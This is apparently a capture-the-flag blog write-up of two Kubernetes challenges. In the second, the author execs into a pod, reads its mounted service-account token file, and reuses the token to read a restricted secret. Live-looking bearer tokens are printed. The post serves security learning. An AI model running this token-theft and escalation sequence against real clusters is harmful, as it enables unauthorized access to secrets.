---
layout: post
title:  "Kubernetes Challenges"
date:   2026-08-04 18:10:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Universal-CTF-2026-kubernetes/
---
* TOC
{:toc}

## Welcome Aboard

**Author**: Yewolf

**Category**: kubernetes

**Description**: The Carina sector is coming online. Use the provided kubeconfig to survey the welcome namespace, follow the beacon trail, and recover the flag.

I start an instance and go to `https://http-01kz0tyvsj61fftrswhq8hs962.u-ctf-ctf-7001b39a.urc.tf/`:

![Alt text](/images/unikubernetes1.png)

I copy the Kubeconfig:
```yaml
apiVersion: v1
kind: Config
clusters:
    - name: default
      cluster:
        server: https://api-01kz0tyvsj61fftrswhq8hs962.u-ctf-ctf-7001b39a.urc.tf
users:
    - name: default
      user:
        token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImdXOVJDX2lOYVhvOGRlOVMwMXFYQmlkVlZfTHhGaWdoejNYdHhQQjlxdDQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODE3MTk2OTYwLCJpYXQiOjE3ODU2NjA5NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZWVhYzFkNGQtM2NiMC00MjEyLWJlM2QtZjhlZmRkYmFiZjdhIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ3ZWxjb21lIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlbGNvbWUtcmVhZGVyIiwidWlkIjoiNDhkYmRlYWEtZmNkOC00NGZlLWJjMWUtYTBkYTlmMTMzM2FiIn19LCJuYmYiOjE3ODU2NjA5NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp3ZWxjb21lOndlbGNvbWUtcmVhZGVyIn0.aVcJivaZw2EE6BzqdgMTRGxXFwXYMeb4jgvX0klYur5CjFaHQxCyuMlifkG0Xy94JpFH5UL-AwVjqRTGt_0xTnofbN4oBtjx0DYilog-Fux6iUnGRlU3VoFj25DoZT13QL8bKjFwdU9JvzyL3HF3JiqnhBlSFoyU3TUGqEeWBk6eFByq9hOIZE262rh5cL2iCg9g37eltRDFRWUVO8tsjzgeVqKA-ycboawiNOUXybT8XbMeMxJo9oORQCFaofpZT1ZJv5ZtfC-Va4-hqCUv01caVzu1wU3xsWueb0-MYPUnQHG7THoeH9mL4D4AxXf96fQonm6Ofq2HCpm6AvgXCg
contexts:
    - name: default
      context:
        cluster: default
        user: default
current-context: default
```

I put the config into a file called `config.yaml` and set the environment variable:
```shell
export KUBECONFIG=./config.yaml
```

I look for a secret:
```shell
kubectl get secrets -n welcome  
NAME           TYPE     DATA   AGE  
welcome-flag   Opaque   1      9m7s
```

Get the secret:
```shell
kubectl get secret welcome-flag -n welcome -o jsonpath='{.data.flag}' | base64 -d  
uctf{79482a2b2e4314841639d5c92c0dc13f1c02}
```

`uctf{79482a2b2e4314841639d5c92c0dc13f1c02}`

___

## Identity Crisis

**Author**: Yewolf

**Category**: kubernetes

**Description**: This old Carina maintenance machine was decommissioned long ago and left drifting in the dark, more forgotten than retired. Everyone insists it is secure precisely because it is unused, untouched, and never held anything worth protecting.

I go to the instance and save my `config.yaml` and export the environment variable. 

I look at my permissions:
```shell
kubectl auth can-i --list -n welcome  
Resources                                       Non-Resource URLs                      Resource Names   Verbs  
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]  
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]  
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]  
namespaces                                      []                                     []               [get list]  
[/.well-known/openid-configuration/]   []               [get]  
[/.well-known/openid-configuration]    []               [get]  
[/api/*]                               []               [get]  
[/api]                                 []               [get]  
[/apis/*]                              []               [get]  
[/apis]                                []               [get]  
[/healthz]                             []               [get]  
[/healthz]                             []               [get]  
[/livez]                               []               [get]  
[/livez]                               []               [get]  
[/openapi/*]                           []               [get]  
[/openapi]                             []               [get]  
[/openid/v1/jwks/]                     []               [get]  
[/openid/v1/jwks]                      []               [get]  
[/readyz]                              []               [get]  
[/readyz]                              []               [get]  
[/version/]                            []               [get]  
[/version/]                            []               [get]  
[/version]                             []               [get]  
[/version]                             []               [get]
```

While enumerating the `maintenance` namespace I found the `maintenance-auditor` had a RoleBinding granting `pods/exec` permissions. This meant I could execute commands inside running containers:
```shell
kubectl get namespaces  
NAME              STATUS   AGE  
default           Active   6m28s  
kube-node-lease   Active   6m28s  
kube-public       Active   6m28s  
kube-system       Active   6m28s  
maintenance       Active   6m20s  
vault             Active   6m20s

kubectl get ns maintenance -o yaml  
apiVersion: v1  
kind: Namespace  
metadata:  
  annotations:  
	kubectl.kubernetes.io/last-applied-configuration: |  
	  {"apiVersion":"v1","kind":"Namespace","metadata":{"annotations":{},"name":"maintenance"}}  
  creationTimestamp: "2026-08-02T09:12:59Z"  
  labels:  
	kubernetes.io/metadata.name: maintenance  
  name: maintenance  
  resourceVersion: "333"  
  uid: 84f1eab3-7338-4abc-8782-75846bd0e913  
spec:  
  finalizers:  
  - kubernetes  
status:  
  phase: Active
```

I used `kubectl exec` into the `artifact-cache` pod. In Kubernetes, every pod automatically has a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This token belongs to the pod's service account:
```shell
kubectl exec -it artifact-cache-8f8db9769-xj66h -n maintenance -- /bin/sh  
# ls -la /var/run/secrets/kubernetes.io/serviceaccount/  
total 4  
drwxrwxrwt 3 root root  140 Aug  2 09:13 .  
drwxr-xr-x 3 root root 4096 Aug  2 09:13 ..  
drwxr-xr-x 2 root root  100 Aug  2 09:13 ..2026_08_02_09_13_00.2137955822  
lrwxrwxrwx 1 root root   32 Aug  2 09:13 ..data -> ..2026_08_02_09_13_00.2137955822  
lrwxrwxrwx 1 root root   13 Aug  2 09:13 ca.crt -> ..data/ca.crt  
lrwxrwxrwx 1 root root   16 Aug  2 09:13 namespace -> ..data/namespace  
lrwxrwxrwx 1 root root   12 Aug  2 09:13 token -> ..data/token  
# cat /var/run/secrets/kubernetes.io/serviceaccount/token  
eyJhbGciOiJSUzI1NiIsImtpZCI6InJlSVI5amVWakpPZFloVEFoZ2JTYUE5SWtIRjUtVjdTRERxRUFkU2JoRzgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODE3MTk3OTgwLCJpYXQiOjE3ODU2NjE5ODAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjBjYzA1MTgtOWM4Ny00Y2NhLTk0YzItNDdlYTU3OGMzMDNiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJtYWludGVuYW5jZSIsIm5vZGUiOnsibmFtZSI6Im5vZGUtMSIsInVpZCI6IjZmNzJlMTVmLWRmNjItNGVlZC04OTc3LWUwZjBhMmQwMjRlYSJ9LCJwb2QiOnsibmFtZSI6ImFydGlmYWN0 etc etc etc
```

I took this token and replaced the `token:` field in my `config.yaml`. This basically steals the `release-bot`s identity. I check permissions with this new token:
```shell
kubectl --kubeconfig=./config.yaml auth can-i --list -n vault   
Resources                                       Non-Resource URLs                      Resource Names        Verbs  
selfsubjectreviews.authentication.k8s.io        []                                     []                    [create]  
selfsubjectaccessreviews.authorization.k8s.io   []                                     []                    [create]  
selfsubjectrulesreviews.authorization.k8s.io    []                                     []                    [create]  
[/.well-known/openid-configuration/]   []                    [get]  
[/.well-known/openid-configuration]    []                    [get]  
[/api/*]                               []                    [get]  
[/api]                                 []                    [get]  
[/apis/*]                              []                    [get]  
[/apis]                                []                    [get]  
[/healthz]                             []                    [get]  
[/healthz]                             []                    [get]  
[/livez]                               []                    [get]  
[/livez]                               []                    [get]  
[/openapi/*]                           []                    [get]  
[/openapi]                             []                    [get]  
[/openid/v1/jwks/]                     []                    [get]  
[/openid/v1/jwks]                      []                    [get]  
[/readyz]                              []                    [get]  
[/readyz]                              []                    [get]  
[/version/]                            []                    [get]  
[/version/]                            []                    [get]  
[/version]                             []                    [get]  
[/version]                             []                    [get]  
secrets                           []   [relay-vault-entry]   [get]
```
It has a specific permission: `get` on the Secret `relay-vault-entry` in the `vault` namespace!

I get the flag:
```shell
kubectl --kubeconfig=./config.yaml get secret relay-vault-entry -n vault -o yaml
apiVersion: v1  
data:  
  flag: dWN0ZnthYjY0MDU5ZTQ3OGQ4NTU3NDc3Y2YzNjc1MWJmZTM1YTAzOWR9  
kind: Secret  
metadata:  
  annotations:  
	kubectl.kubernetes.io/last-applied-configuration: |  
	  {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"relay-vault-entry","namespace":"vault"},"stringData":{"flag":"uctf{ab64059e478d8557477cf36751bfe35a039d}"},"type":"Opaque"}  
  creationTimestamp: "2026-08-02T09:13:00Z"  
  name: relay-vault-entry  
  namespace: vault  
  resourceVersion: "458"  
  uid: 63ce2d31-ef98-4203-8edb-4938ffb1baea  
type: Opaque
```

`uctf{ab64059e478d8557477cf36751bfe35a039d}`